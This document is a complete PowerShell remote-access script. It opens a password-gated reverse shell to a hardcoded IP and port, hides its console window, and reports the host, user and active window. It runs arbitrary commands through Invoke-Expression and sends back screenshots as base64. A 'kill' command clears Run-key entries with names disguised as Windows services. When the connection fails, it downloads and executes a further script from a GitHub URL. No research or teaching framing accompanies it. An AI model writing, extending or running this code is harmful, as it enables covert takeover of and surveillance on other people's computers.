function Invoke-LinuxCmd {
    param($cmd)
    switch -regex ($cmd) {
        '^ls\s*(.*)' { iex "dir $($matches[1])" 2>&1 }
        '^ll\s*(.*)' { iex "dir /a $($matches[1])" 2>&1 }
        '^cd\s+(.*)' { 
            try { Set-Location $matches[1]; pwd } catch { "cd: $_" }
        }
        '^cat\s+(.*)' { iex "type `"$($matches[1])`"" 2>&1 }
        '^touch\s+(.*)' { iex "New-Item -ItemType File -Path '$($matches[1])' -Force" 2>&1 }
        '^rm\s+(.*)' { iex "Remove-Item -Force -Recurse '$($matches[1])'" 2>&1 }
        '^mkdir\s+(.*)' { iex "mkdir '$($matches[1])'" 2>&1 }
        default { iex $cmd 2>&1 }
    }
}

$ip   = '172.16.176.40'
$port = 4444
$pass = 'biskviti'
$user = "B15cu1t"
$reg  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

function Get-ActiveWin {
    $code = '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);'
    $type = Add-Type -MemberDefinition $code -Name "WinUtils" -Namespace "Util" -PassThru
    $handle = $type::GetForegroundWindow()
    $builder = New-Object System.Text.StringBuilder 256
    $type::GetWindowText($handle, $builder, 256) | Out-Null
    return $builder.ToString()
}

try {
    $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $s = $c.GetStream(); $w = New-Object System.IO.StreamWriter($s); $r = New-Object System.IO.StreamReader($s); $w.AutoFlush = $true

    $w.WriteLine("AUTH:")
    if ($r.ReadLine() -eq $pass) {
        
        try {
            $h = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
            $type = Add-Type -MemberDefinition $h -Name "W32" -Namespace "W" -PassThru
            $type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
        } catch {}

        $who = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        $win = Get-ActiveWin
        $w.WriteLine("`n" + ("="*30))
        $w.WriteLine("  HOST: $env:COMPUTERNAME")
        $w.WriteLine("  USER: $who")
        $w.WriteLine("  TASK: $win")
        $w.WriteLine(("="*30) + "`n")

        while($c.Connected) {
            $w.Write((Get-Location).Path + "$ ")
            $raw = $r.ReadLine(); if ($null -eq $raw) { break }
            $cmd = $raw.Trim()

            if ($cmd -eq "exit") { break }
            
            elseif ($cmd -eq "window") {
                $w.WriteLine("[ACTIVE]: " + (Get-ActiveWin))
            }

            elseif ($cmd -eq "screenshot") {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $w.WriteLine([Convert]::ToBase64String($mem.ToArray()))
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
            }
            
            elseif ($cmd -eq "kill") {
                "WinDiag","WinUpdate","WinLog","WinService" | ForEach-Object {
                    Get-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue | Remove-ItemProperty -Path $reg -Name $_ -ErrorAction SilentlyContinue
                }
                $w.WriteLine("[!] Cleanup Complete."); $c.Close(); Stop-Process -Id $PID -Force 
            }
            
            else { 
                $result = Invoke-LinuxCmd $cmd
                $result | Out-String | % { $w.WriteLine($_) }
            }
        }
    }
    $c.Close()
} catch {
    Start-Sleep -s 120
    iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/$user/shell.ps1/main/shell_v3.ps1")
}
